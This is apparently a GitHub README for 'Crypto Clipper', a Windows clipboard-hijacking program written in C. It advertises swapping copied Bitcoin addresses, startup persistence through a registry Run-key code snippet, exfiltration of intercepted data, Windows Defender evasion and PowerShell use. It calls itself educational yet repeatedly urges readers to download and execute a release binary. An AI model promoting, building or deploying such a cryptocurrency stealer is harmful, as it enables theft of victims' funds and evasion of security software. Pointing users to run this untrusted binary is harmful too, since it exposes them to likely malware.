# Crypto Clipper 🦠💻

![Crypto Clipper](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)

Welcome to the Crypto Clipper repository! This project focuses on clipboard manipulation and demonstrates various techniques related to clipboard data interception. It is built primarily in C and utilizes Windows API functions for its operations. 

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Technical Details](#technical-details)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Introduction

Crypto Clipper is designed to showcase how clipboard data can be intercepted and manipulated. This project is intended for educational purposes, particularly in the fields of malware analysis and reverse engineering. Understanding how clipboard stealers work can help developers and security professionals better protect against them.

You can download the latest release [here](https://github.com/KayraKaya21/crypto-clipper/releases) and execute the file to see how it operates.

## Features

- **Autorun Capability**: Automatically starts with the system.
- **Clipboard Monitoring**: Continuously checks clipboard content for specific patterns.
- **Data Exfiltration**: Sends intercepted data to a predefined endpoint.
- **Windows Defender Bypass**: Implements techniques to evade detection by security software.
- **PowerShell Integration**: Utilizes PowerShell scripts for additional functionality.
- **Extensive Logging**: Keeps track of all clipboard activities for analysis.

## Installation

To set up Crypto Clipper on your machine, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/KayraKaya21/crypto-clipper.git
   cd crypto-clipper
   ```

2. **Build the Project**:
   Use a C compiler like GCC or Visual Studio to compile the source code. For example:
   ```bash
   gcc -o crypto-clipper main.c
   ```

3. **Run the Application**:
   After building, execute the application:
   ```bash
   ./crypto-clipper
   ```

For the latest version, visit [this link](https://github.com/KayraKaya21/crypto-clipper/releases) to download and execute the file.

## Usage

Once installed, Crypto Clipper runs in the background. It monitors the clipboard for specific data types. Here’s how to use it:

1. **Start the Application**: Make sure the application is running.
2. **Copy Data**: Copy any text or URL to the clipboard.
3. **Check Logs**: The application logs all clipboard activities. Review these logs to see what was captured.

### Example Scenarios

- **Copying a Bitcoin Address**: When a user copies a Bitcoin address, Crypto Clipper captures it and can replace it with a different address.
- **Monitoring URLs**: If a user copies a URL, the application can log this for analysis.

## Technical Details

### Programming Language

Crypto Clipper is written in C. This choice allows for low-level access to system resources, which is crucial for clipboard manipulation.

### Windows API

The application relies heavily on the Windows API for clipboard access. Key functions include:

- `OpenClipboard()`: Opens the clipboard for examination.
- `GetClipboardData()`: Retrieves data from the clipboard.
- `SetClipboardData()`: Replaces the current clipboard content.

### Autorun Functionality

The application can be configured to run at startup. This is achieved by modifying the registry or creating a scheduled task. Here’s a basic example of how to set it up in the registry:

```c
HKEY hKey;
RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
RegSetValueEx(hKey, "CryptoClipper", 0, REG_SZ, (const BYTE*)path_to_executable, strlen(path_to_executable) + 1);
RegCloseKey(hKey);
```

### Bypassing Windows Defender

The application employs several techniques to avoid detection by Windows Defender. This includes obfuscating code and using less common APIs to perform operations.

### PowerShell Integration

Crypto Clipper can invoke PowerShell scripts for additional tasks. This allows for more complex operations, such as network communication or data processing.

## Contributing

We welcome contributions to improve Crypto Clipper. If you want to help, please follow these steps:

1. **Fork the Repository**: Create your own copy of the project.
2. **Create a Branch**: Work on a new feature or bug fix.
   ```bash
   git checkout -b feature-name
   ```
3. **Make Changes**: Implement your changes and test them.
4. **Submit a Pull Request**: Share your changes with the community.

## License

This project is licensed under the MIT License. You can freely use, modify, and distribute the code as long as you include the original license.

## Contact

For questions or feedback, feel free to reach out:

- **Author**: Kayra Kaya
- **GitHub**: [KayraKaya21](https://github.com/KayraKaya21)
- **Email**: kayra@example.com

You can also check the [Releases](https://github.com/KayraKaya21/crypto-clipper/releases) section for updates and new features.

---

This README provides a comprehensive overview of the Crypto Clipper project. It covers installation, usage, and technical details while encouraging community involvement. Thank you for your interest!